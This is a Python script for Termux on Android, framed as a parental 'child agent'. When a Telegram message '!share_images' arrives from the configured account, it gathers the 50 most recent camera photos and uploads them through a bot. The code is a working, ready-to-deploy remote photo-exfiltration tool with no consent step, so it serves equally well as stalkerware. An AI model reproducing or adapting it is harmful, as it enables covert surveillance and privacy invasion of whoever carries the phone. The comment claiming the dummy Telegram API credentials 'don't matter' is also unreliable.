# child.py
# Termux child agent for sending camera photos to parent Telegram
# Usage: python child.py
# Requirements on child phone:
#   pkg install python termux-api
#   pip install telethon
#   termux-setup-storage (to grant storage permissions)

import os, json, asyncio
from telethon import TelegramClient, events

# ================= CONFIG =================
# 1️⃣ Create a local config.json in the same folder as child.py:
# {
#   "BOT_TOKEN": "<YOUR_BOT_TOKEN>",
#   "CHAT_ID": <YOUR_TELEGRAM_USER_ID>
# }
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")

# 2️⃣ Edit config.json with your BOT_TOKEN and parent CHAT_ID
with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

BOT_TOKEN = config["BOT_TOKEN"]
CHAT_ID = config["CHAT_ID"]

# ================= CAMERA PATHS =================
# Camera photos are usually here (works with or without SD card)
MEDIA_DIRS = [
    "/sdcard/DCIM/Camera",
    "/storage/emulated/0/DCIM/Camera"
]

# Only these image types will be sent
IMAGE_EXTS = (".jpg",".jpeg",".png",".heic",".webp")

# ================= FUNCTIONS =================
def list_media(limit=50):
    """Return the most recent camera photos (up to `limit`)."""
    files = []
    for base in MEDIA_DIRS:
        if not os.path.exists(base):
            continue
        for root, dirs, filenames in os.walk(base):
            for fn in filenames:
                if fn.lower().endswith(IMAGE_EXTS):
                    path = os.path.join(root, fn)
                    try:
                        mtime = os.path.getmtime(path)
                    except:
                        mtime = 0
                    files.append((mtime, path))
    files.sort(reverse=True)
    return [p for _, p in files[:limit]]

async def send_gallery(client):
    """Send camera photos to the parent via Telegram."""
    files = list_media(limit=50)
    if not files:
        await client.send_message(CHAT_ID, "No camera photos found.")
        return
    await client.send_message(CHAT_ID, f"Sending {len(files)} recent camera photos:")
    for fpath in files:
        if os.path.exists(fpath):
            try:
                await client.send_file(CHAT_ID, fpath)
            except Exception as e:
                await client.send_message(CHAT_ID, f"Failed to send {fpath}: {e}")

# ================= MAIN =================
async def main():
    # Dummy API_ID/API_HASH required for bot account (values don't matter)
    client = TelegramClient('child_session', 12345, '0123456789abcdef0123456789abcdef', bot_token=BOT_TOKEN)
    await client.start(bot_token=BOT_TOKEN)

    @client.on(events.NewMessage)
    async def handler(event):
        # Only respond to messages from parent
        if event.sender_id != CHAT_ID:
            return
        text = (event.raw_text or "").strip().lower()
        if text == "!share_images":
            await send_gallery(client)

    print("Child agent online — waiting for commands from parent.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
